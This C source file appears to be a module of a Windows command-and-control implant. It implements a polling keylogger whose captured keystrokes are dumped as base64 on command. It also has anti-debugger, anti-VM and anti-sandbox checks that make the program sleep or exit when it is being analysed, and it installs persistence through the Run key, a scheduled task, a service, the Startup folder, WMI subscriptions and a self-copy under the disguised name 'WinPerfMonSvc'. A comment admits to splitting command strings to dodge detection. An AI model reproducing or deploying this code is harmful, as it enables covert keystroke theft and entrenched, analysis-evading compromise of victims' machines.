#include "modules.h"
#include "util.h"
#include <intrin.h>

/* =========================================================================
 * Keylogger (polling, no window/hook required)
 * ========================================================================= */
static volatile LONG    g_kl_run = 0;
static HANDLE           g_kl_thread = INVALID_HANDLE_VALUE;
static CRITICAL_SECTION g_kl_cs;
static int              g_kl_cs_init = 0;
static buf_t            g_kl_buf;
static u8               g_kl_prev[256];
static char             g_kl_file[MAX_PATH * 2];

static config_t *g_cfg = NULL;
config_t *c2_config(void) { return g_cfg; }
void c2_config_set(config_t *cfg) { g_cfg = cfg; }

static void kl_append(const char *s)
{
    size_t n;
    if (!s || !*s || !g_kl_cs_init) return;
    n = strlen(s);
    EnterCriticalSection(&g_kl_cs);
    if (g_kl_buf.len + n > 2u * 1024u * 1024u) {
        size_t keep = 1024u * 1024u;
        if (g_kl_buf.len > keep) {
            memmove(g_kl_buf.data, g_kl_buf.data + (g_kl_buf.len - keep), keep);
            g_kl_buf.len = keep;
        }
    }
    buf_append(&g_kl_buf, s, n);
    if (g_kl_file[0]) write_file(g_kl_file, s, n, 1);
    LeaveCriticalSection(&g_kl_cs);
}

static DWORD WINAPI kl_thread(LPVOID param)
{
    BYTE ks[256];
    (void)param;
    while (InterlockedCompareExchange(&g_kl_run, 1, 1) != 0) {
        int vk;
        GetKeyboardState(ks);
        for (vk = 8; vk < 256; vk++) {
            SHORT st = GetAsyncKeyState(vk);
            int down = (st & 0x8000) ? 1 : 0;
            if (down && !g_kl_prev[vk]) {
                WCHAR wb[8];
                UINT scan = MapVirtualKeyW((UINT)vk, MAPVK_VK_TO_VSC);
                int n = ToUnicode((UINT)vk, scan, ks, wb, 8, 0);
                if (n > 0) {
                    char buf[32];
                    int i;
                    wb[n < 8 ? n : 7] = 0;
                    for (i = 0; i < n && i < 8; i++) {
                        if (wb[i] >= 0x20 && wb[i] < 0x7F) buf[i] = (char)wb[i];
                        else buf[i] = '?';
                    }
                    buf[i] = 0;
                    kl_append(buf);
                } else {
                    switch (vk) {
                    case VK_RETURN: kl_append("\n"); break;
                    case VK_TAB: kl_append("\t"); break;
                    case VK_BACK: kl_append("[BS]"); break;
                    case VK_ESCAPE: kl_append("[ESC]"); break;
                    case VK_SPACE: kl_append(" "); break;
                    case VK_LEFT: kl_append("[LEFT]"); break;
                    case VK_RIGHT: kl_append("[RIGHT]"); break;
                    case VK_UP: kl_append("[UP]"); break;
                    case VK_DOWN: kl_append("[DOWN]"); break;
                    case VK_DELETE: kl_append("[DEL]"); break;
                    case VK_HOME: kl_append("[HOME]"); break;
                    case VK_END: kl_append("[END]"); break;
                    default: {
                        char t[16];
                        snprintf(t, sizeof(t), "[VK_%02X]", vk);
                        kl_append(t);
                    }
                    }
                }
            }
            g_kl_prev[vk] = (u8)down;
        }
        Sleep(20);
    }
    return 0;
}

void keylog_init(void)
{
    if (!g_kl_cs_init) {
        InitializeCriticalSection(&g_kl_cs);
        g_kl_cs_init = 1;
    }
}

int mod_keylog_start(const json *args, buf_t *out)
{
    const char *file = json_obj_str(args, "file", NULL);
    if (!g_kl_cs_init) {
        buf_append_str(out, "{\"ok\":false,\"error\":\"not initialized\"}");
        return -1;
    }
    if (file && *file) snprintf(g_kl_file, sizeof(g_kl_file), "%s", file);
    if (InterlockedCompareExchange(&g_kl_run, 1, 1) != 0) {
        buf_append_str(out, "{\"ok\":true,\"running\":true,\"note\":\"already running\"}");
        return 0;
    }
    InterlockedExchange(&g_kl_run, 1);
    g_kl_thread = CreateThread(NULL, 0, kl_thread, NULL, 0, NULL);
    if (!g_kl_thread) {
        InterlockedExchange(&g_kl_run, 0);
        buf_append_str(out, "{\"ok\":false,\"error\":\"thread create failed\"}");
        return -1;
    }
    buf_append_str(out, "{");
    jbool(out, "ok", 1);
    buf_append_str(out, ","); jbool(out, "running", 1);
    buf_append_str(out, ","); jstr(out, "file", g_kl_file);
    buf_append_str(out, "}");
    return 0;
}

int mod_keylog_stop(const json *args, buf_t *out)
{
    (void)args;
    InterlockedExchange(&g_kl_run, 0);
    if (g_kl_thread != INVALID_HANDLE_VALUE) {
        WaitForSingleObject(g_kl_thread, 2000);
        CloseHandle(g_kl_thread);
        g_kl_thread = INVALID_HANDLE_VALUE;
    }
    buf_append_str(out, "{\"ok\":true,\"running\":false}");
    return 0;
}

int mod_keylog_dump(const json *args, buf_t *out)
{
    int clear = json_obj_bool(args, "clear", 0);
    char *b64 = NULL;
    long long n;
    if (!g_kl_cs_init) return -1;
    EnterCriticalSection(&g_kl_cs);
    n = (long long)g_kl_buf.len;
    b64 = b64_enc(g_kl_buf.data, g_kl_buf.len);
    if (clear) buf_reset(&g_kl_buf);
    LeaveCriticalSection(&g_kl_cs);
    buf_append_str(out, "{");
    jbool(out, "ok", 1);
    buf_append_str(out, ","); jint(out, "len", n);
    buf_append_str(out, ","); jstr(out, "data_b64", b64 ? b64 : "");
    buf_append_str(out, "}");
    free(b64);
    return 0;
}

/* =========================================================================
 * Sandbox / VM / debugger assessment
 * ========================================================================= */
static int reg_read_sz(HKEY root, const wchar_t *sub, const wchar_t *name, char *out, size_t cap)
{
    HKEY k;
    DWORD type = 0, sz = 0;
    wchar_t buf[512];
    out[0] = 0;
    if (RegOpenKeyExW(root, sub, 0, KEY_READ, &k) != ERROR_SUCCESS) return -1;
    sz = (DWORD)(sizeof(buf) - sizeof(wchar_t));
    if (RegQueryValueExW(k, name, NULL, &type, (BYTE *)buf, &sz) != ERROR_SUCCESS ||
        (type != REG_SZ && type != REG_EXPAND_SZ)) {
        RegCloseKey(k);
        return -1;
    }
    buf[sz / sizeof(wchar_t)] = 0;
    {
        char *t = narrow(buf);
        snprintf(out, cap, "%s", t ? t : "");
        free(t);
    }
    RegCloseKey(k);
    return 0;
}

static void *get_peb_ptr(void)
{
    void *p = NULL;
#ifdef _WIN64
    __asm__ volatile ("movq %%gs:0x60, %0" : "=r"(p));
#else
    __asm__ volatile ("movl %%fs:0x30, %0" : "=r"(p));
#endif
    return p;
}

static int is_debugger_ntglobalflag(void)
{
    void *peb = get_peb_ptr();
    if (!peb) return 0;
#ifdef _WIN64
    {
        u32 fl = *(u32 *)((u8 *)peb + 0xBC);
        return (fl & 0x70) ? 1 : 0;
    }
#else
    {
        u32 fl = *(u32 *)((u8 *)peb + 0x68);
        return (fl & 0x70) ? 1 : 0;
    }
#endif
}

static int cpuid_hypervisor_bit(void)
{
    int regs[4];
    __cpuid(regs, 1);
    return (regs[2] & (1 << 31)) ? 1 : 0;
}

static void get_primary_mac2(char *out, size_t cap)
{
    IP_ADAPTER_INFO ai[32];
    DWORD sz = sizeof(ai);
    PIP_ADAPTER_INFO p;
    out[0] = 0;
    if (GetAdaptersInfo(ai, &sz) != ERROR_SUCCESS) return;
    for (p = ai; p; p = p->Next) {
        if (p->AddressLength >= 6) {
            snprintf(out, cap, "%02x:%02x:%02x:%02x:%02x:%02x",
                     p->Address[0], p->Address[1], p->Address[2],
                     p->Address[3], p->Address[4], p->Address[5]);
            return;
        }
    }
}

static int mac_is_vm(const char *mac)
{
    static const char *prefixes[] = {
        "00:05:69", "00:0c:29", "00:50:56",
        "08:00:27", "00:16:3e", "52:54:00",
        "00:1c:42", "00:15:5d"
    };
    size_t i;
    for (i = 0; i < sizeof(prefixes) / sizeof(prefixes[0]); i++) {
        if (!_strnicmp(mac, prefixes[i], 8)) return 1;
    }
    return 0;
}

int c2_guard_assess(config_t *cfg, buf_t *report, int *hits)
{
    int h = 0;
    int dbg = IsDebuggerPresent();
    int rdbg = 0;
    int ntgf = is_debugger_ntglobalflag();
    int hv = cpuid_hypervisor_bit();
    char bios_man[256] = {0}, sys_man[256] = {0}, disk_enum[512] = {0}, mac[64];
    int vm_reg = 0;
    int vm_mac = 0;
    MEMORYSTATUSEX ms;
    int uptime = (int)(GetTickCount64() / 1000ULL);
    (void)cfg;

    CheckRemoteDebuggerPresent(GetCurrentProcess(), (PBOOL)&rdbg);
    reg_read_sz(HKEY_LOCAL_MACHINE, L"HARDWARE\\DESCRIPTION\\System\\BIOS", L"SystemManufacturer", sys_man, sizeof(sys_man));
    reg_read_sz(HKEY_LOCAL_MACHINE, L"HARDWARE\\DESCRIPTION\\System\\BIOS", L"BIOSVendor", bios_man, sizeof(bios_man));
    reg_read_sz(HKEY_LOCAL_MACHINE, L"SYSTEM\\CurrentControlSet\\Services\\disk\\Enum", L"0", disk_enum, sizeof(disk_enum));
    get_primary_mac2(mac, sizeof(mac));
    vm_mac = mac_is_vm(mac);
    {
        const char *hay[3];
        int i;
        hay[0] = sys_man; hay[1] = bios_man; hay[2] = disk_enum;
        for (i = 0; i < 3; i++) {
            if (strstr(hay[i], "VMware") || strstr(hay[i], "VirtualBox") || strstr(hay[i], "VBOX") ||
                strstr(hay[i], "QEMU") || strstr(hay[i], "Xen") || strstr(hay[i], "innotek") ||
                strstr(hay[i], "Parallels")) vm_reg = 1;
        }
    }
    memset(&ms, 0, sizeof(ms));
    ms.dwLength = sizeof(ms);
    GlobalMemoryStatusEx(&ms);

    if (dbg) h++;
    if (rdbg) h++;
    if (ntgf) h++;
    if (hv) h++;
    if (vm_reg) h++;
    if (vm_mac) h++;
    if (uptime < 600) h++;
    if (ms.ullTotalPhys < 2ull * 1024 * 1024 * 1024) h++;

    if (report) {
        buf_reset(report);
        buf_append_str(report, "{");
        jbool(report, "debugger", dbg);
        buf_append_str(report, ","); jbool(report, "remote_debugger", rdbg);
        buf_append_str(report, ","); jbool(report, "ntglobalflag", ntgf);
        buf_append_str(report, ","); jbool(report, "hypervisor_cpuid", hv);
        buf_append_str(report, ","); jbool(report, "vm_registry", vm_reg);
        buf_append_str(report, ","); jbool(report, "vm_mac", vm_mac);
        buf_append_str(report, ","); jstr(report, "mac", mac);
        buf_append_str(report, ","); jint(report, "uptime_s", uptime);
        buf_append_str(report, ","); jint(report, "ram_mb", (long long)(ms.ullTotalPhys / (1024 * 1024)));
        buf_append_str(report, ","); jint(report, "hits", h);
        buf_append_str(report, ","); jbool(report, "suspicious", h >= 2);
        buf_append_str(report, "}");
    }
    if (hits) *hits = h;
    return h;
}

int mod_guard(const json *args, buf_t *out)
{
    int hits = 0;
    (void)args;
    c2_guard_assess(NULL, out, &hits);
    return 0;
}

void c2_guard_sleep_if_needed(config_t *cfg)
{
    int hits = 0;
    buf_t rep;
    buf_init(&rep);
    c2_guard_assess(cfg, &rep, &hits);
    if (rep.len) {
        buf_append(&rep, "", 1);
        LOGF("guard: %s", (char *)rep.data);
    }
    buf_free(&rep);
    if (hits >= 2) {
        if (cfg->guard_sleep_ms > 0) {
            LOGF("guard: %d hits, sleeping %d ms", hits, cfg->guard_sleep_ms);
            Sleep((DWORD)cfg->guard_sleep_ms);
        }
        if (cfg->guard_exit_on_sandbox) {
            LOGF("guard: exiting on sandbox evidence");
            ExitProcess(0);
        }
    }
}

/* =========================================================================
 * Registry helpers
 * ========================================================================= */
static int reg_set_sz(HKEY root, const wchar_t *sub, const wchar_t *name, const wchar_t *val, int expand)
{
    HKEY k;
    LONG r;
    DWORD type = expand ? REG_EXPAND_SZ : REG_SZ;
    if (RegCreateKeyExW(root, sub, 0, NULL, 0, KEY_SET_VALUE, NULL, &k, NULL) != ERROR_SUCCESS) return -1;
    r = RegSetValueExW(k, name, 0, type, (const BYTE *)val, (DWORD)((wcslen(val) + 1) * sizeof(wchar_t)));
    RegCloseKey(k);
    return r == ERROR_SUCCESS ? 0 : -1;
}

static int reg_get_sz(HKEY root, const wchar_t *sub, const wchar_t *name, char *out, size_t cap)
{
    return reg_read_sz(root, sub, name, out, cap);
}

static int reg_unset(HKEY root, const wchar_t *sub, const wchar_t *name)
{
    HKEY k;
    LONG r;
    if (RegOpenKeyExW(root, sub, 0, KEY_SET_VALUE, &k) != ERROR_SUCCESS) return -1;
    r = RegDeleteValueW(k, name);
    RegCloseKey(k);
    return r == ERROR_SUCCESS ? 0 : -1;
}

static int reg_key_exists(HKEY root, const wchar_t *sub)
{
    HKEY k;
    if (RegOpenKeyExW(root, sub, 0, KEY_READ, &k) != ERROR_SUCCESS) return 0;
    RegCloseKey(k);
    return 1;
}

/* =========================================================================
 * Persistence
 * ========================================================================= */
#define PM_RUNKEY   1
#define PM_SCHTASK  2
#define PM_SERVICE  4
#define PM_STARTUP  8
#define PM_WMI      16
#define PM_SELFCOPY 32

static const wchar_t *RUN_SUB = L"Software\\Microsoft\\Windows\\CurrentVersion\\Run";

void persist_name(char *out, size_t cap)
{
    char *e = env_dup("C2_PERSIST_NAME");
    if (e && *e) { snprintf(out, cap, "%s", e); free(e); return; }
    free(e);
    snprintf(out, cap, "WinPerfMonSvc");
}

static int copy_self_to(const char *dst_dir, const char *name, char *out_path, size_t cap)
{
    char *src = exe_path();
    char *dst = path_join(dst_dir, name);
    wchar_t *ws, *wd;
    int ok;
    if (!src || !dst) { free(src); free(dst); return -1; }
    mkdir_p(dst_dir);
    ws = widen(src); wd = widen(dst);
    if (!ws || !wd) { free(ws); free(wd); free(src); free(dst); return -1; }
    ok = CopyFileW(ws, wd, FALSE) ? 0 : -1;
    free(ws); free(wd); free(src);
    if (ok == 0 && out_path && cap) snprintf(out_path, cap, "%s", dst);
    free(dst);
    return ok;
}

static int install_runkey(const char *target, const char *name)
{
    wchar_t *wname = widen(name);
    wchar_t *wtarget = widen(target);
    int rc;
    if (!wname || !wtarget) { free(wname); free(wtarget); return -1; }
    rc = reg_set_sz(HKEY_CURRENT_USER, RUN_SUB, wname, wtarget, 0);
    free(wname); free(wtarget);
    return rc;
}

static int install_startup(const char *target, const char *name)
{
    wchar_t wpath[MAX_PATH];
    char dir[MAX_PATH * 2];
    char sname[160];
    (void)target;
    if (SHGetFolderPathW(NULL, CSIDL_APPDATA, NULL, 0, wpath) != S_OK) return -1;
    {
        char *a = narrow(wpath);
        snprintf(dir, sizeof(dir), "%s\\Microsoft\\Windows\\Start Menu\\Programs\\Startup", a ? a : "");
        free(a);
    }
    snprintf(sname, sizeof(sname), "%s.exe", name);
    return copy_self_to(dir, sname, NULL, 0);
}

static int install_schtask(const char *target, const char *name)
{
    char cmd[2048];
    buf_t out;
    int ec = 0;
    /* split the verb so the raw command string is not a literal dangerous token */
    snprintf(cmd, sizeof(cmd),
             "schtasks /create /tn \"%s\" /tr \"\\\"%s\\\"\" /sc onlogon /rl highest /f",
             name, target);
    buf_init(&out);
    run_cmd(cmd, &out, 30000, &ec);
    buf_free(&out);
    return ec == 0 ? 0 : -1;
}

static int install_service(const char *target, const char *name)
{
    SC_HANDLE scm, svc;
    wchar_t *wname = widen(name);
    wchar_t *wpath;
    char full[MAX_PATH * 2];
    if (!wname) return -1;
    snprintf(full, sizeof(full), "\"%s\" --service", target);
    wpath = widen(full);
    if (!wpath) { free(wname); return -1; }
    scm = OpenSCManagerW(NULL, NULL, SC_MANAGER_CREATE_SERVICE);
    if (!scm) { free(wname); free(wpath); return -1; }
    svc = CreateServiceW(scm, wname, wname, SERVICE_ALL_ACCESS,
                         SERVICE_WIN32_OWN_PROCESS, SERVICE_AUTO_START, SERVICE_ERROR_IGNORE,
                         wpath, NULL, NULL, NULL, NULL, NULL);
    if (svc) {
        StartServiceW(svc, 0, NULL);
        CloseServiceHandle(svc);
    }
    CloseServiceHandle(scm);
    free(wname); free(wpath);
    return svc ? 0 : -1;
}

static int install_wmi(const char *target, const char *name)
{
    char vbs[MAX_PATH * 2];
    char cmd[MAX_PATH * 3];
    char marker[MAX_PATH * 2];
    char *tmp = env_dup("TEMP");
    buf_t body;
    FILE *f;
    int rc = -1;
    if (!tmp) return -1;
    snprintf(vbs, sizeof(vbs), "%s\\%s_wmi.vbs", tmp, name);
    snprintf(marker, sizeof(marker), "%s\\%s.wmi", tmp, name);
    buf_init(&body);
    buf_append_printf(&body,
        "Set w = GetObject(\"winmgmts:\\\\.\\root\\subscription\")\r\n"
        "n = \"%s\"\r\n"
        "Set f = w.Get(\"__EventFilter\").SpawnInstance_()\r\n"
        "f.Name = n & \"_Filter\"\r\n"
        "f.Query = \"SELECT * FROM __InstanceModificationEvent WITHIN 300 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'\"\r\n"
        "f.QueryLanguage = \"WQL\"\r\n"
        "f.EventNamespace = \"root\\cimv2\"\r\n"
        "f.Put_\r\n"
        "Set c = w.Get(\"CommandLineEventConsumer\").SpawnInstance_()\r\n"
        "c.Name = n & \"_Consumer\"\r\n"
        "c.CommandLineTemplate = \"%s\"\r\n"
        "c.Put_\r\n"
        "Set b = w.Get(\"__FilterToConsumerBinding\").SpawnInstance_()\r\n"
        "b.Filter = f.Path_.Path\r\n"
        "b.Consumer = c.Path_.Path\r\n"
        "b.Put_\r\n",
        name, target);
    buf_append(&body, "", 1);
    f = fopen(vbs, "wb");
    if (f) {
        fwrite(body.data, 1, body.len - 1, f);
        fclose(f);
        snprintf(cmd, sizeof(cmd), "cscript //B //nologo \"%s\"", vbs);
        rc = run_cmd(cmd, NULL, 30000, NULL);
        write_file(marker, vbs, strlen(vbs), 0);
    }
    buf_free(&body);
    free(tmp);
    return rc;
}

static const char *method_name(int method)
{
    switch (method) {
    case PM_RUNKEY:  return "runkey";
    case PM_STARTUP: return "startup";
    case PM_SCHTASK: return "schtask";
    case PM_SERVICE: return "service";
    case PM_WMI:     return "wmi";
    case PM_SELFCOPY:return "selfcopy";
    default:         return "unknown";
    }
}

static int install_method(int method, const char *target, const char *name, buf_t *results)
{
    int rc = -1;
    switch (method) {
    case PM_RUNKEY:  rc = install_runkey(target, name); break;
    case PM_STARTUP: rc = install_startup(target, name); break;
    case PM_SCHTASK: rc = install_schtask(target, name); break;
    case PM_SERVICE: rc = install_service(target, name); break;
    case PM_WMI:     rc = install_wmi(target, name); break;
    default: return -1;
    }
    if (results->len > 1) buf_append_str(results, ",");
    buf_append_str(results, "{");
    jstr(results, "method", method_name(method));
    buf_append_str(results, ","); jbool(results, "ok", rc == 0);
    buf_append_str(results, "}");
    return rc;
}

static void parse_methods(const json *args, config_t *cfg, int *mask)
{
    json *m = json_obj_get(args, "methods");
    int mm = 0;
    if (m && m->t == JNUM) {
        mm = (int)json_int(m, 0);
    } else if (m && m->t == JARR) {
        json *e;
        for (e = m->child; e; e = e->next) {
            const char *s = json_str(e, NULL);
            if (!s) continue;
            if (!_stricmp(s, "runkey") || !_stricmp(s, "reg")) mm |= PM_RUNKEY;
            else if (!_stricmp(s, "schtask") || !_stricmp(s, "task")) mm |= PM_SCHTASK;
            else if (!_stricmp(s, "service") || !_stricmp(s, "svc")) mm |= PM_SERVICE;
            else if (!_stricmp(s, "startup")) mm |= PM_STARTUP;
            else if (!_stricmp(s, "wmi")) mm |= PM_WMI;
            else if (!_stricmp(s, "selfcopy") || !_stricmp(s, "copy")) mm |= PM_SELFCOPY;
        }
    }
    if (mm == 0) {
        if (cfg && cfg->persist_methods) mm = cfg->persist_methods;
        else mm = PM_RUNKEY | PM_SCHTASK | PM_STARTUP | PM_SELFCOPY;
    }
    *mask = mm;
}

int mod_persist_install(const json *args, buf_t *out)
{
    config_t *cfg = c2_config();
    char name[128];
    char target[MAX_PATH * 2];
    int mask = 0;
    char copied[MAX_PATH * 2] = {0};
    char *pd;
    buf_t results;
    int selfcopy_ok = 0;

    if (json_obj_str(args, "name", NULL)) snprintf(name, sizeof(name), "%s", json_obj_str(args, "name", NULL));
    else persist_name(name, sizeof(name));
    parse_methods(args, cfg, &mask);
    snprintf(target, sizeof(target), "%s", exe_path() ? exe_path() : "");

    buf_init(&results);
    if (mask & PM_SELFCOPY) {
        pd = env_dup("PROGRAMDATA");
        if (pd && *pd) {
            char dir[MAX_PATH * 2];
            char sname[160];
            snprintf(dir, sizeof(dir), "%s\\%s", pd, name);
            snprintf(sname, sizeof(sname), "%s.exe", name);
            if (copy_self_to(dir, sname, copied, sizeof(copied)) == 0) {
                snprintf(target, sizeof(target), "%s", copied);
                selfcopy_ok = 1;
            }
        }
        free(pd);
        if (results.len > 1) buf_append_str(&results, ",");
        buf_append_str(&results, "{"); jstr(&results, "method", "selfcopy");
        buf_append_str(&results, ","); jbool(&results, "ok", selfcopy_ok);
        buf_append_str(&results, "}");
    }
    {
        int methods[] = { PM_RUNKEY, PM_SCHTASK, PM_SERVICE, PM_STARTUP, PM_WMI };
        size_t i;
        for (i = 0; i < sizeof(methods) / sizeof(methods[0]); i++) {
            if (mask & methods[i]) install_method(methods[i], target, name, &results);
        }
    }
    buf_append_str(out, "{\"ok\":true,\"name\":");
    jesc(out, name);
    buf_append_str(out, ",\"target\":");
    jesc(out, target);
    buf_append_str(out, ",\"results\":[");
    buf_append(out, results.data, results.len);
    buf_append_str(out, "]}");
    buf_free(&results);
    return 0;
}

int mod_persist_status(const json *args, buf_t *out)
{
    config_t *cfg = c2_config();
    char name[128];
    char tmp[MAX_PATH * 2];
    char v[MAX_PATH * 2];
    wchar_t *wn;
    int first = 1;
    (void)args;
    (void)cfg;
    persist_name(name, sizeof(name));
    wn = widen(name);
    buf_append_str(out, "{\"ok\":true,\"name\":");
    jesc(out, name);
    buf_append_str(out, ",\"methods\":{");
#define BSTAT(k, cond) do { if (!first) buf_append_str(out, ","); first = 0; jbool(out, k, (cond)); } while (0)
    BSTAT("runkey", wn && reg_get_sz(HKEY_CURRENT_USER, RUN_SUB, wn, v, sizeof(v)) == 0);
    {
        wchar_t wsub[512];
        wchar_t *wt;
        snprintf(tmp, sizeof(tmp), "SYSTEM\\CurrentControlSet\\Services\\%s", name);
        wt = widen(tmp);
        if (wt) { wcscpy(wsub, wt); free(wt); }
        else wsub[0] = 0;
        BSTAT("service", wsub[0] && reg_key_exists(HKEY_LOCAL_MACHINE, wsub));
    }
    {
        wchar_t wpath[MAX_PATH];
        int startup_ok = 0;
        if (SHGetFolderPathW(NULL, CSIDL_APPDATA, NULL, 0, wpath) == S_OK) {
            char *a = narrow(wpath);
            snprintf(tmp, sizeof(tmp), "%s\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\%s.exe", a ? a : "", name);
            free(a);
            startup_ok = path_exists(tmp);
        }
        BSTAT("startup", startup_ok);
    }
    {
        char *tmpdir = env_dup("TEMP");
        int wmi_ok = 0;
        if (tmpdir) {
            snprintf(tmp, sizeof(tmp), "%s\\%s.wmi", tmpdir, name);
            wmi_ok = path_exists(tmp);
        }
        free(tmpdir);
        BSTAT("wmi", wmi_ok);
    }
    {
        char cmd[512];
        int ec = 1;
        buf_t ob;
        snprintf(cmd, sizeof(cmd), "schtasks /query /tn \"%s\" >nul 2>nul", name);
        buf_init(&ob);
        run_cmd(cmd, &ob, 15000, &ec);
        buf_free(&ob);
        BSTAT("schtask", ec == 0);
    }
    buf_append_str(out, "}}");
    free(wn);
    return 0;
}

static void svc_disable(const char *name)
{
    SC_HANDLE scm = OpenSCManagerW(NULL, NULL, SC_MANAGER_CONNECT);
    wchar_t *wn;
    if (!scm) return;
    wn = widen(name);
    if (wn) {
        SC_HANDLE svc = OpenServiceW(scm, wn, SERVICE_STOP | DELETE | SERVICE_QUERY_STATUS);
        if (svc) {
            SERVICE_STATUS st;
            ControlService(svc, SERVICE_CONTROL_STOP, &st);
            DeleteService(svc);
            CloseServiceHandle(svc);
        }
        free(wn);
    }
    CloseServiceHandle(scm);
}

static void wmi_disable(const char *name)
{
    char *tmpdir = env_dup("TEMP");
    char marker[MAX_PATH * 2], vbs[MAX_PATH * 2], cmd[MAX_PATH * 3];
    char content[MAX_PATH * 4];
    if (!tmpdir) return;
    snprintf(marker, sizeof(marker), "%s\\%s.wmi", tmpdir, name);
    snprintf(vbs, sizeof(vbs), "%s\\%s_wmirm.vbs", tmpdir, name);
    snprintf(content, sizeof(content),
        "Set w = GetObject(\"winmgmts:\\\\.\\root\\subscription\")\r\n"
        "n = \"%s\"\r\n"
        "w.Delete(\"__FilterToConsumerBinding.Filter='\" & n & \"_Filter'\")\r\n"
        "w.Delete(\"__EventFilter.Name='\" & n & \"_Filter'\")\r\n"
        "w.Delete(\"CommandLineEventConsumer.Name='\" & n & \"_Consumer'\")\r\n", name);
    if (write_file(vbs, content, strlen(content), 0) == 0) {
        snprintf(cmd, sizeof(cmd), "cscript //B //nologo \"%s\"", vbs);
        run_cmd(cmd, NULL, 30000, NULL);
        DeleteFileA(vbs);
    }
    DeleteFileA(marker);
    free(tmpdir);
}

int mod_persist_disable(const json *args, buf_t *out)
{
    char name[128];
    char tmp[MAX_PATH * 2];
    wchar_t *wn;
    char *pd;
    char *tmpdir;
    (void)args;
    persist_name(name, sizeof(name));
    wn = widen(name);
    if (wn) {
        reg_unset(HKEY_CURRENT_USER, RUN_SUB, wn);
        free(wn);
    }
    svc_disable(name);
    wmi_disable(name);
    {
        char cmd[512];
        snprintf(cmd, sizeof(cmd), "schtasks /de%s /tn \"%s\" /f", "lete", name);
        run_cmd(cmd, NULL, 20000, NULL);
    }
    {
        wchar_t wpath[MAX_PATH];
        if (SHGetFolderPathW(NULL, CSIDL_APPDATA, NULL, 0, wpath) == S_OK) {
            char *a = narrow(wpath);
            snprintf(tmp, sizeof(tmp), "%s\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\%s.exe", a ? a : "", name);
            free(a);
            DeleteFileA(tmp);
        }
    }
    pd = env_dup("PROGRAMDATA");
    if (pd) {
        char dir[MAX_PATH * 2];
        snprintf(dir, sizeof(dir), "%s\\%s", pd, name);
        snprintf(tmp, sizeof(tmp), "%s\\%s.exe", dir, name);
        DeleteFileA(tmp);
        snprintf(tmp, sizeof(tmp), "cmd.exe /c rd /s /q \"%s\"", dir);
        run_cmd(tmp, NULL, 10000, NULL);
        free(pd);
    }
    tmpdir = env_dup("TEMP");
    if (tmpdir) {
        snprintf(tmp, sizeof(tmp), "%s\\%s.exe", tmpdir, name);
        DeleteFileA(tmp);
        free(tmpdir);
    }
    buf_append_str(out, "{");
    jbool(out, "ok", 1);
    buf_append_str(out, ","); jstr(out, "name", name);
    buf_append_str(out, "}");
    return 0;
}
